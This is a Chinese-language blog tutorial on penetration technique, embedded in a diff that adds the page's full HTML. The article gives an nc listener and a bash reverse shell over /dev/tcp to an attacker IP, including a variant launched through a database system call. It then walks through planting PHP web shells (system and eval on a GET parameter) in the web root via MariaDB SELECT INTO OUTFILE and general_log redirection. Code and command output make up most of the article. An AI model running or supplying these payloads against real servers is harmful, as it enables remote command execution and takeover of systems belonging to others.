@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/artibix.jpg">
+  <link rel="icon" href="/img/artibix.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Artibix">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="获取 WebShell 和反弹 Bash">
+<meta property="og:url" content="https://artibix.github.io/reverse-shell/index.html">
+<meta property="og:site_name" content="Artibix&#39;s Blogs">
+<meta property="og:description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
+<meta property="article:published_time" content="2021-04-28T14:23:26.000Z">
+<meta property="article:modified_time" content="2025-05-09T09:04:47.464Z">
+<meta property="article:author" content="Artibix">
+<meta property="article:tag" content="nc">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Bash">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
+  
+  
+  
+  <title>获取 WebShell 和反弹 Bash - Artibix&#39;s Blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"artibix.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Artibix&#39;Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="获取 WebShell 和反弹 Bash"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-04-28 22:23" pubdate>
+          2021年4月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          810 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">获取 WebShell 和反弹 Bash</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。</p>
+<span id="more"></span>
+
+<h2 id="反弹-BASH"><a href="#反弹-BASH" class="headerlink" title="反弹 BASH"></a>反弹 BASH</h2><p>与 SSH 的区别在于，可以让目标主机主动连接黑客的主机，从而绕过防火墙的限制。</p>
+<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>最常用的反弹 Bash 方式是利用 nc（netcat）工具，黑客在自己电脑上监听端口</p>
+<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token operator">&lt;</span> 端口 <span class="token operator">></span></code></pre></div></figure>
+
+<ul>
+<li><code>-l</code>: 监听模式。</li>
+<li><code>-v</code>: 显示详细的信息。</li>
+<li><code>-n</code>: 不进行域名解析。</li>
+<li><code>-p &lt; 端口 &gt;</code>: 监听的端口号。</li>
+</ul>
+<p>在目标主机执行</p>
+<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/<span class="token operator">&lt;</span> 攻击者 IP<span class="token operator">></span>/<span class="token operator">&lt;</span> 端口 <span class="token operator">></span> <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre></div></figure>
+
+<ul>
+<li><p><code>-i</code>: 交互式 shell</p>
+</li>
+<li><p><code>&amp;&gt;</code>: 将标准输出和错误进行重定向</p>
+</li>
+<li><p><code>/dev/tcp/ip/port</code>: bash 建立 socket 的一种特殊写法，除此之外还有 udp</p>
+</li>
+<li><p><code>&lt;&amp;1</code>: 把标准输入重定向到标准输出，其他写法 <code>0&gt;&amp;1</code></p>
+</li>
+</ul>
+<div class="note note-primary">
+            <p>什么？你要问我都能连接到靶机执行指令了还要什么 nc？哼哼，黑客通常是使用各种漏洞连接到靶机，使用 nc 只是为了更方便的执行系统指令。</p><p>比如利用数据库漏洞执行 nc 反弹 bash</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">system <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i &amp;> /dev/tcp/&#123;外部机器 IP&#125;/&#123;端口&#125; &lt;&amp;1'</span></code></pre></div></figure>
+          </div>
+
+<h2 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h2><p>利用 Web 服务器漏洞执行 shell 指令，下面演示利用 PHP + MariaDB 写入一个后门文件。</p>
+<h3 id="利用-secure-file-priv"><a href="#利用-secure-file-priv" class="headerlink" title="利用 secure_file_priv"></a>利用 secure_file_priv</h3><p>主要用于限制数据库对文件系统的访问。它规定 MySQL 服务器可以进行文件导入导出操作的目录。</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% secure%'</span>
+<span class="token operator">|</span> Variable_name            <span class="token operator">|</span> <span class="token keyword">Value</span>   <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">--------------------------|---------|</span>
+<span class="token operator">|</span> require_secure_transport <span class="token operator">|</span> <span class="token keyword">OFF</span>     <span class="token operator">|</span>
+<span class="token operator">|</span> secure_auth              <span class="token operator">|</span> <span class="token keyword">ON</span>      <span class="token operator">|</span>
+<span class="token operator">|</span> secure_file_priv         <span class="token operator">|</span>         <span class="token operator">|</span>
+<span class="token operator">|</span> secure_timestamp         <span class="token operator">|</span> <span class="token keyword">NO</span>      <span class="token operator">|</span></code></pre></div></figure>
+
+<ul>
+<li>空字符串（’’）： 不限制导入导出目录，MySQL 可以在任意目录进行文件操作。</li>
+<li>指定目录： 只能在指定的目录进行导入导出操作。例如：secure_file_priv&#x3D;’&#x2F;var&#x2F;lib&#x2F;mysql’</li>
+<li>NULL： 禁止所有的文件导入导出操作，包括 LOAD DATA INFILE、SELECT … INTO OUTFILE 和 LOAD_FILE () 函数。</li>
+</ul>
+<p>然后查看用户是否具有 IO 权限</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>file_priv<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span></code></pre></div></figure>
+
+<p>执行代码将后门输出到服务器</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @system ($_GET ['cmd']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/srv/http/houmen.php'</span><span class="token punctuation">;</span></code></pre></div></figure>
+
+<p>接下来就可以利用这个文件为所欲为啦</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/img/article/2021/webshell.jpg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用-general-log"><a href="#利用-general-log" class="headerlink" title="利用 general_log"></a>利用 general_log</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是 NULL，还可以使用 <code>general_log</code> 的方法来写 shell，它记录所有基础日志，默认关闭状态。</p>
+<ol>
+<li>模糊查找关于 general 的信息</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
+<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">OFF</span>              <span class="token operator">|</span>
+<span class="token operator">|</span> general_log_file <span class="token operator">|</span>                  <span class="token operator">|</span></code></pre></div></figure>
+
+<ol start="2">
+<li>开启 general_log，设置路径</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'/srv/http/hm.php'</span><span class="token punctuation">;</span>
+MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
+<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">ON</span>               <span class="token operator">|</span>
+<span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>srv<span class="token operator">/</span>http<span class="token operator">/</span>hm<span class="token punctuation">.</span>php <span class="token operator">|</span></code></pre></div></figure>
+
+<ol start="3">
+<li>写入数据</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">"&lt;?php @eval ($_GET ['command']);?>"</span></code></pre></div></figure>
+
+<figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php">> sudo cat /srv/http/hm.php
+/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:
+Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sock
+Time                Id Command  Argument
+210429 17:29:36      3 Query    select "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"</code></pre></div></figure>
+
+<div class="note note-danger">
+            <p>如果数据库用户权限被严格管控了 IO，那么将无法实现上述步骤，比如在 Linux 里面，httpd 的用户是 http，mariadb 的用户是 mysql，默认情况下，mysql 无法写入，httpd 无法读取</p>
+          </div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后端只要满足三个条件就可以反弹 shell</p>
+<ul>
+<li>支持 tcp 链接</li>
+<li>支持 IO 重定向</li>
+<li>可以调用系统命令</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment">常见数据库写入 Webshell 汇总</a></li>
+<li><a target="_blank" rel="noopener" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/nc/" class="print-no-link">#nc</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/Bash/" class="print-no-link">#Bash</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>获取 WebShell 和反弹 Bash</div>
+      <div>https://artibix.github.io/reverse-shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Artibix</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年4月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/tools-triliumnext/" title="如何使用 Trilium 做笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">如何使用 Trilium 做笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/wake-on-lan/" title="Manjaro + 微星 B365M 主板设置 Wake On Lan">
+                        <span class="hidden-mobile">Manjaro + 微星 B365M 主板设置 Wake On Lan</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"artibix/artibix.github.io","repo-id":"R_kgDOM-nVBg","category":"Announcements","category-id":"DIC_kwDOM-nVBs4CjQjW","theme-light":"light","theme-dark":"dark","mapping":"title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN","theme":"preferred_color_scheme","strict":0,"crossorigin":"anonymous"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
